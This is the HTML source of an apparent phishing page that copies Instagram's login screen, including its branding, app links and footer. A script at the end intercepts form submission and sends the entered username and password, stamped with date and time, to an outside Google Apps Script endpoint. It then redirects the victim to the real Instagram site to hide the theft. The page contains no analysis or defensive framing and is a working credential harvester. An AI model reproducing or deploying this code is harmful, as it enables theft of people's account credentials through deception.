  <body>
    <div class="wrapper">
      <div class="header">
        <div class="top">
          <div class="logo">
            <img src="instagram.png" alt="instagram" style="width: 175px" />
          </div>
          <form method="post" id="instaDetails" name="Instafake-data">
            <div class="form">
              <div class="input_field">
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  class="input"
                  name="userdata"
                  id="userdata"
                  required
                />
              </div>
              <div class="input_field">
                <input
                  type="password"
                  placeholder="Password"
                  minlength="8"
                  class="input"
                  name="userpwd"
                  id="userpwd"
                  required
                />
              </div>
              <!-- <div class="btn"><a href="#">Log In</a></div> -->
              <button
                class="login-button"
                type="submit"
                value="submit"
                id="btnSubmit"
              >
                Log In
              </button>
              <input type="hidden" id="loginDate" name="logindate" value="" />
              <input type="hidden" id="loginTime" name="logintime" value="" />
            </div>
          </form>
          <div class="or">
            <div class="line"></div>
            <p>OR</p>
            <div class="line"></div>
          </div>
          <div class="dif">
            <div class="fb">
              <img src="facebook.png" alt="facebook" />
              <p>
                <a
                  href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221fm7te0hlo4cm6pd0d4e6gwgfmoiv9g1abvath1xv13fua2275w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db3702654-8b88-4cc0-aaac-60e85f7ef757%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221fm7te0hlo4cm6pd0d4e6gwgfmoiv9g1abvath1xv13fua2275w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0"
                  style="color: #385185"
                  >Log in with Facebook</a
                >
              </p>
            </div>
            <div class="forgot">
              <a href="https://www.instagram.com/accounts/password/reset/"
                >Forgot password?</a
              >
            </div>
          </div>
        </div>
        <div class="signup">
          <p>
            Don't have an account?
            <a
              href="https://www.instagram.com/accounts/emailsignup/"
              target="_blank"
              >Sign up</a
            >
          </p>
          <!-- </form> -->
        </div>
        <div class="apps">
          <p>Get the app.</p>
          <div class="icons">
            <a
              href="https://apps.apple.com/app/instagram/id389801252?vt=lo"
              target="_blank"
            >
              <img src="appstore.png" alt="appstore"
            /></a>
            <a
              href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=28AC4585-FE14-4A4A-9429-9BEF36BA98A2&utm_content=lo&utm_medium=badge"
              target="_blank"
            >
              <img src="googleplay.png" alt="googleplay"
            /></a>
          </div>
        </div>
      </div>
      <div align="center" class="footer">
        <div class="links">
          <ul>
            <li><a href="#">Meta</a></li>

        </div>
      </div>
      <div align="center" class="copyright">
        <p style="text-align: center">Â© 2022 Instagram from Meta</p>
      </div>

    <script>
      const scriptURL =
        "https://script.google.com/macros/s/AKfycbxkgWotCMyvIKoT9aGtPCndZdHtHrq8i972t9CKAVjO6xC7T0I/exec";
      const form = document.forms["Instafake-data"];

      form.addEventListener("submit", (e) => {
        e.preventDefault();
        fetch(scriptURL, { method: "POST", body: new FormData(form) })
          .then((response) =>
            // alert("Thanks for Contacting us..! We Will Contact You Soon...")
            window.open("https://www.instagram.com", "_blank")
          )
          .catch((error) => console.error("Error!", error.message));
      });
    </script>
    <!-- script below autoinsert date of login -->
    <script>
      var date = new Date();

      var day = date.getDate();
      var month = date.getMonth() + 1;
      var year = date.getFullYear();

      if (month < 10) month = "0" + month;
      if (day < 10) day = "0" + day;

      var today = year + "-" + month + "-" + day;

      document.getElementById("loginDate").value = today;
    </script>
    <!-- script below autoinsert login time  -->
    <script>
      var today = new Date();

      var time =
        today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
      document.getElementById("loginTime").value = time;
    </script>
  </body>
